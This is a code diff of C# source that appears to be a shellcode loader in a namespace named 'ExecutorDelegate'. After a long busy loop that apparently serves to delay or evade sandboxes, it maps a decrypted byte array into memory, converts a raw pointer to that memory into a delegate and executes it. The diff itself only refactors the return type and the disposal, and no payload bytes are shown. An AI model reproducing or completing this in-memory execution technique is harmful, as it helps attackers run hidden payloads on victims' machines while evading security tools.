@@ -199,15 +199,14 @@ namespace ExecutorDelegate {
             for (int i = 0; i < 100000000; i++) {
 
                 if (i == 99999999) {
-
-                    var function = Execute();
+                    Execute();
                     Console.WriteLine(""Done."");
                 }
             }
             return;
         }
 
-        private static unsafe IntPtr Execute() {
+        private unsafe static void Execute() {
             MemoryMappedFile mmf = null;
             MemoryMappedViewAccessor mmva = null;
             byte[] decryptedArray = decrypted.ToArray();
@@ -219,12 +218,15 @@ namespace ExecutorDelegate {
                 var pointer = (byte*)0;
                 mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pointer);
                 var func = (ExecutionDelegate)Marshal.GetDelegateForFunctionPointer(new IntPtr(pointer), typeof(ExecutionDelegate));
-                return func();
+                func();
             } catch {
-                return IntPtr.Zero;
             } finally {
-                mmva.Dispose();
-                mmf.Dispose();
+                if(mmva != null) {
+                    mmva.Dispose();
+                }
+                if(mmf != null) {
+                    mmf.Dispose();
+                }
             }
         }
 
